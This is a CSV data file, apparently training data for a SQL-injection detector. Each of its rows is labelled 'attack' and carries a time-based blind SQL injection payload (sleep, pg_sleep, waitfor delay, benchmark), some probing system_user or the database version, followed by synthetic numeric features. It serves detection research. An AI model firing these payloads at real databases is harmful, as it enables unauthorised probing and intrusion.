id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000092,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.6603907187692598,37.71832384327224,16.0,3.035234621040133,11.0,0.0,17.084517030908742,9.633806812363497,0.2933481071506453,0.0,0.4514153325533179,0.2552365602960368,0.18309659381825116,1.6338068123634977,0.0,0.0,0.0,1.0,0.0,2.816903406181749,0.0,4.0,0.0,1.0,0.1830965938182511,0.8169034061817488,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000093,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,1.1780114457472337,31.57862716635799,15.052418110905329,3.3732738079989177,16.05241811090533,1.0,10.0,4.526209055452664,0.5079728644765555,0.03173876043802222,0.3173876043802223,0.14290077070519996,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.5262090554526642,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4737909445473358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4737909445473358
SMOTE_000094,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,nearest_attack_euclidean,R000238,0.9810193293220015,115.84307994597846,26.014892791356555,3.0665731972400816,33.738830406482585,7.783508780552246,60.32074075894363,14.0,0.2952776467275297,0.06431952609156577,0.5183648957328479,0.12203793144805658,0.7388304064825846,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,11.261169593517415,0.0,0.0,0.0,2.0,0.24627680216086156,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000095,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.6394242744209275,68.25703191523934,28.0,4.220164029130446,34.00937588698579,4.114452127140993,16.62851595761967,13.504687943492893,0.49750421420948754,0.06168072257350137,0.2433857967602228,0.19742926645678832,3.8761719858732224,1.1102230246251565e-16,2.0,0.0,0.0,0.12382801412677691,0.0,1.8761719858732229,0.0,0.8761719858732231,0.8761719858732231,4.0,1.0,0.0,1.0,0.0,0.0,0.1238280141267768,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.12382801412677691,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.123828014126777
SMOTE_000096,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,0.3082196501574948,90.34025655865226,26.544043981483245,3.4092836424709243,21.468051311730452,17.39205864197766,40.708124614202525,10.772021990741623,0.23823565585846912,0.19194231287508,0.4500490941152095,0.11977293715124139,0.0,1.1102230246251565e-16,2.0,0.0,0.0,1.9240073302472074,0.0,5.848014660494415,0.0,0.0,1.0,3.924007330247208,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.9240073302472074,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9240073302472074
SMOTE_000097,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,1.3026294727104692,49.51764315444693,21.747059474258844,3.96701995513048,25.98823789703538,3.0,12.023524205929238,8.50588105148231,0.5279548819010923,0.06074346857124197,0.2399508990509777,0.17135075047668805,2.7588215772234648,2.2411784227765352,0.0,0.0,0.0,0.2529405257411549,0.0,1.2529405257411552,0.0,0.0,0.0,0.252940525741155,1.0,0.7470594742588451,0.0,0.0,0.0,0.2529405257411549,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000098,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.008021042021188559,100.0,33.0,4.067530144996391,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000099,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",nearest_attack_euclidean,R000267,1.38466678601279,116.77065277183404,24.112207265871685,3.153887987471164,41.22441453174338,2.0,57.21454913889819,16.33168910119247,0.3550401005401519,0.01717950410173874,0.48819468635964575,0.13958570899846365,0.0,3.9999999999999996,0.0,0.0,1.0,0.44389636706415686,0.0,10.887792734128313,0.0,0.0,0.0,1.443896367064157,0.0,1.0,0.0,0.0,0.0,0.4438963670641568,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000100,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.8455828753467457,30.6198204242272,13.619820424227203,2.908976351495983,10.000000000000002,2.0,14.0,4.619820424227203,0.3266685975889548,0.06533371951779096,0.4573360366245367,0.15066164626871753,0.6198204242272037,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,2.220446049250313e-16,0.6198204242272037,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000101,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,1.2427986406852523,89.70139782037774,22.425349455094437,2.9912850710615744,28.45520967305666,2.0,45.79097847426442,13.455209673056661,0.31930987908679176,0.022574650544905567,0.5081154703683027,0.15,1.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.455209673056661,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.5149301089811129,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.514930108981113
SMOTE_000102,attack,time,1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000168,0.5741902121725927,104.73525894758848,30.47051789517696,3.6257910530078723,30.0,18.0,45.0,11.73525894758848,0.28644159629783383,0.1718649577787003,0.42966239444675075,0.11203105147671508,0.7352589475884806,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,4.0,0.7352589475884806,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000103,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6988178374339021,33.0,17.0,3.504123773197531,13.0,0.7125570542913744,10.0,9.287442945708625,0.3939393939393939,0.02159263800882953,0.30303030303030304,0.2814376650214735,0.0,0.28744294570862544,2.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,5.0,0.0,2.0,0.0,0.2874429457086254,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000104,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,0.12625383143958313,101.02712446648766,25.610849786595068,3.411124133308394,40.51356223324383,1.902712446648767,44.708137339946305,13.902712446648767,0.40092404568040035,0.018757717457928272,0.4426693742202235,0.13764886264144788,3.902712446648766,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000105,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.8769310476093845,37.25610355571268,16.628051777856342,3.3142105006856153,13.0,0.0,13.628051777856342,10.62805177785634,0.3491744545144263,0.0,0.3657021328790668,0.28512341260650687,0.0,0.6280517778563406,2.0,0.0,0.0,0.0,0.0,3.0,0.0,5.0,0.0,2.0,0.0,0.6280517778563405,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000106,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",nearest_attack_euclidean,R000251,2.1965067978507555,86.87180564397161,26.489317136997634,3.902494296917258,35.0,15.0,27.893171369976347,8.978634273995269,0.40481704532868623,0.1734930194265798,0.3186373757011466,0.10305255954358741,1.5320485890070956,1.4679514109929044,0.0,0.0,0.0,0.0,0.0,4.97863427399527,0.0,0.0,1.0,2.220446049250313e-16,0.5106828630023651,0.4893171369976349,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.702106395667257,117.19031699796767,24.19953890466513,3.201939563771087,44.40138328600462,2.0,54.99077809330255,15.798155618660509,0.3813097375782576,0.01714564562171872,0.466995889423249,0.1345487273767747,0.0,3.9999999999999996,0.0,0.0,1.0,0.0,0.0,10.798155618660509,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.19953890466512753,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.199538904665127
SMOTE_000108,attack,time,select sleep  (  5  )   and 'gajm'  =  'gajm,nearest_attack_euclidean,R000207,0.4040751060674659,44.44156398867972,18.662345983019577,3.5321803840990693,21.77921800566014,1.2207819943398581,15.220781994339859,6.220781994339859,0.4904007828547887,0.027308717273850827,0.34243623909128357,0.13985426078007682,3.220781994339858,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.7792180056601415,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7792180056601414
SMOTE_000109,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,1.37858349128672,49.93816657973058,17.938166579730577,3.3631584547972877,23.876333159461154,1.0,18.53091671013471,6.530916710134711,0.47751126853122206,0.02003274646669445,0.3714244713012084,0.13103151370087507,0.0,3.0,0.0,0.0,0.0,0.5309167101347114,0.0,3.0,0.0,0.0,0.0,0.5309167101347116,0.0,1.0,0.0,0.0,0.0,0.5309167101347114,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000110,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.7502972884872235,55.71077489127096,23.566162336906434,3.968126189883682,26.42154978254191,3.855387445635478,15.433837663093565,10.0,0.4740131831210421,0.06913313405770599,0.27732582201196276,0.17952786080928917,2.4338376630935663,3.421549782541911,0.0,0.0,0.0,0.14461255436452214,0.0,1.9999999999999996,0.0,0.0,0.0,0.14461255436452225,1.0,0.8553874456354778,0.0,0.0,0.0,0.14461255436452214,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000111,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,nearest_attack_euclidean,R000285,0.03445482477054917,101.76005347645503,26.88002673822751,3.437411694009795,40.880026738227514,1.9760053476455024,44.928016042936505,13.976005347645502,0.40170508682486683,0.019398171196390784,0.4415446749721918,0.13735206700655062,3.9760053476455015,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000112,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.5658629789665137,118.13226438293384,27.17354712341323,3.292420474337599,38.520641370239694,10.0,55.95871725952061,13.652905753173538,0.3263253926365205,0.08467325344026697,0.47350348548250953,0.11549786844070303,0.8264528765867696,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.826452876586771,0.0,0.0,0.0,2.0,0.8264528765867696,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,1.0,1.0,0.0,0.8264528765867698,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.826452876586769
SMOTE_000113,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.5539160932602263,60.90506233919153,18.945991688107796,2.956695231068247,10.000000000000002,10.0,31.37805818324543,9.527004155946102,0.1667451100466384,0.16674511004663836,0.5086891197478943,0.15782066015882898,0.47299584405389783,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.581012467838306,0.47299584405389783,0.0,1.0,1.0,0.47299584405389783,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.23901283702850057,54.27458566636852,18.817916333375926,3.4726661443740934,28.0,1.0,18.09250199974445,7.1820836666240755,0.5170791199187676,0.018467111425670285,0.33214926089880215,0.13230450775675984,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.1820836666240746,0.0,1.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,1.5165013150693423,48.11231366129882,22.921322092170755,3.9049799694939886,15.651652615213443,9.84264418434151,14.078677907829249,8.539338953914623,0.32356897605515916,0.20036485827046027,0.29649945013701284,0.1795667155373677,2.0,0.2696694769573114,2.0,0.0,0.0,0.7303305230426886,0.0,1.5393389539146227,0.0,0.0,0.0,2.7303305230426886,1.0,0.2696694769573114,1.0,0.0,0.0,0.7303305230426888,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.7303305230426885,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7303305230426886
SMOTE_000116,attack,time,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000180,2.6394713896763116,93.09489915562062,22.301517775511922,3.0976399681315145,15.650758887755963,14.539586941328894,46.253794438779806,16.650758887755963,0.1708217472210614,0.1509851324368695,0.4961862968957077,0.18200682344636138,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,7.650758887755961,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.41268972193899034,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.5873102780610098,0.41268972193899034,0.0,0.0,0.0,0.0,0.0,0.0,0.5873102780610095,0.4126897219389904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,0.05314088304792244,121.74184674390122,29.0,3.3648372473995476,26.046936955654324,21.011734238913583,57.74184674390121,16.941328805432093,0.21413428633183573,0.17269285209225665,0.4740555894762031,0.13911727209970448,0.0,3.9999999999999996,0.0,0.0,0.0,1.988265761086419,0.0,9.953063044345676,0.0,0.0,1.0,1.988265761086419,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.011734238913581,0.9882657610864192,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.6636005764091141,56.99270292687477,20.0,3.105800723864103,13.0,10.61482330206729,26.1482330206729,7.22964660413458,0.23110429952291903,0.18768904296660616,0.45471012490963686,0.12649653260083799,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,5.22964660413458,0.0,0.0,1.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000119,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,1.0687320505278028,44.078251468521444,16.589854289043455,3.227891472325534,18.71883431234763,1.0,17.359417156173816,7.0,0.4200228069484623,0.023122861848581658,0.39499429826288446,0.16186003294007162,0.0,3.0,0.0,0.0,0.0,1.0,0.0,2.589854289043454,0.41014571095654606,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,0.3279756459601396,78.97656284314009,27.0,3.743882853683652,23.26633532085639,15.62144908199824,29.088778440285463,11.0,0.2946288115290372,0.1971801477598331,0.3687128199209455,0.13947822079018424,3.088778440285463,1.1102230246251565e-16,0.0,0.0,0.0,1.0887784402854628,0.0,4.911221559714537,0.9112215597145372,0.0,1.0,1.0887784402854628,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.9112215597145372,0.0,2.7755575615628914e-17,0.0,1.0887784402854628,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000121,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.4392308170320862,40.63095479083843,16.0,2.9201815468729926,11.0,0.0,19.630954790838434,10.0,0.27135330787166206,0.0,0.48196186679046343,0.24668482533787456,0.40773869770960836,1.184522604580783,0.0,0.0,0.0,1.0,0.0,3.4077386977096085,0.0,4.0,0.0,1.0,0.4077386977096083,0.5922613022903916,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
